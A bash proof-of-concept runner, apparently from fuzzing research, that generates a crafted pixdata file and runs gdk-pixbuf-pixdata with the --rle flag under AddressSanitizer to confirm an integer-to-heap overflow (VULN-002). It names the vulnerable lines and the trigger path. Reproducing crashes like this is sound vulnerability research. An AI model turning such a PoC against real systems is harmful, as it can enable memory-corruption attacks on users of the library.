#!/bin/bash
# PoC runner for VULN-002: Integer Overflow in gdk_pixdata_from_pixbuf()
# File: gdk-pixdata.c, lines 349, 371-372, 375-377
# CWE-190 (Integer Overflow) -> CWE-122 (Heap Buffer Overflow)
#
# NOTE: The gdk-pixbuf-pixdata binary supports only GdkPixdata format (not BMP).
#       The --rle flag is required to enter the vulnerable RLE encoding path.

set -uo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/gdk-pixbuf/gdk-pixbuf_gdk-pixdata_c"
BINARY="/data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/bin/gdk-pixbuf-pixdata"
LIB_PATH="/data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/lib"
POC_FILE="${POC_DIR}/vuln_002.pixdata"
OUT_FILE="${POC_DIR}/vuln_002_out.c"
RESULT_FILE="${POC_DIR}/vuln_002_result.txt"
ASAN_LOG="${POC_DIR}/asan_002.log"
STATUS_FILE="${POC_DIR}/vuln_002_status.txt"

cd "${POC_DIR}"

echo "================================================================="
echo "VULN-002: gdk-pixbuf integer overflow in gdk_pixdata_from_pixbuf"
echo "Binary:   ${BINARY}"
echo "================================================================="
echo ""

# Step 1: Generate the PoC file
echo "[1] Generating PoC pixdata file..."
if python3 "${POC_DIR}/vuln_002_gen.py"; then
    echo "[+] Generator succeeded"
else
    echo "[-] Generator FAILED"
    echo "ERROR" > "${STATUS_FILE}"
    echo "ERROR: generator failed" > "${RESULT_FILE}"
    echo "Exit code: 1"
    exit 1
fi
echo ""

if [ ! -f "${POC_FILE}" ]; then
    echo "[-] PoC file not found after generation, aborting."
    echo "ERROR" > "${STATUS_FILE}"
    exit 1
fi

echo "[+] PoC file: ${POC_FILE} ($(wc -c < "${POC_FILE}") bytes)"
echo "[+] Hex dump:"
od -A x -t x1z "${POC_FILE}" 2>/dev/null || xxd "${POC_FILE}" 2>/dev/null || true
echo ""

# Step 2: Run the binary with --rle (required to enter the vulnerable code path)
echo "[2] Running: LD_LIBRARY_PATH=${LIB_PATH} ${BINARY} --rle ${POC_FILE} ${OUT_FILE}"
echo "    (ASAN_OPTIONS: detect_leaks=0, print_stacktrace=1, log_path=${ASAN_LOG})"
echo ""

set +e
LD_LIBRARY_PATH="${LIB_PATH}" \
ASAN_OPTIONS="detect_leaks=0:abort_on_error=0:print_stacktrace=1:log_path=${ASAN_LOG}" \
UBSAN_OPTIONS="print_stacktrace=1" \
  "${BINARY}" --rle "${POC_FILE}" "${OUT_FILE}" \
  > "${RESULT_FILE}" 2>&1
EXIT_CODE=$?
set -e

echo "[*] Exit code: ${EXIT_CODE}"
echo ""

# Also check any separate ASAN log files
ASAN_LOGS_FOUND=""
for f in "${ASAN_LOG}."*; do
    if [ -f "${f}" ]; then
        ASAN_LOGS_FOUND="${ASAN_LOGS_FOUND} ${f}"
    fi
done

echo "[3] stdout/stderr output:"
cat "${RESULT_FILE}" 2>/dev/null || true
echo ""

if [ -n "${ASAN_LOGS_FOUND}" ]; then
    echo "[4] ASAN log files found: ${ASAN_LOGS_FOUND}"
    for f in ${ASAN_LOGS_FOUND}; do
        echo "--- ${f} ---"
        head -80 "${f}" 2>/dev/null || true
    done
    echo ""
fi

# Step 3: Determine status
CRASH_DETECTED=0

# Check combined output for ASAN/UBSAN signatures
SEARCH_TARGETS="${RESULT_FILE} ${ASAN_LOGS_FOUND}"

for f in ${SEARCH_TARGETS}; do
    if [ -f "${f}" ] && \
       grep -qE "heap-buffer-overflow|AddressSanitizer|ERROR: AddressSanitizer|UndefinedBehaviorSanitizer|runtime error:|SEGV|stack-buffer-overflow|use-after-free" "${f}" 2>/dev/null; then
        CRASH_DETECTED=1
        break
    fi
done

if [ "${CRASH_DETECTED}" -eq 1 ]; then
    echo "[+] VERIFIED CRASH: ASAN/UBSAN sanitizer error detected."
    echo "    This confirms the integer overflow in gdk_pixdata_from_pixbuf() leading to"
    echo "    heap buffer overflow (CWE-190 -> CWE-122)."
    echo "VERIFIED_CRASH" > "${STATUS_FILE}"
elif [ "${EXIT_CODE}" -ne 0 ]; then
    echo "[~] Binary exited with non-zero code (${EXIT_CODE}) but no ASAN report found."
    echo "    The ~4 GB virtual allocation required for this PoC may have failed."
    echo "    Vulnerability exists in source (gdk-pixdata.c:349) but could not be"
    echo "    triggered on this system due to memory allocation constraints."
    echo "UNVERIFIED" > "${STATUS_FILE}"
else
    echo "[~] Binary exited cleanly (code 0). The ~4 GB virtual allocation likely failed"
    echo "    silently, causing gdk_pixbuf_from_pixdata to return NULL before the overflow."
    echo "    OR the allocation succeeded but g_try_malloc_n returned NULL (not logged)."
    echo "UNVERIFIED" > "${STATUS_FILE}"
fi

echo ""
echo "[*] Final status: $(cat "${STATUS_FILE}")"
echo "[*] Result file: ${RESULT_FILE}"
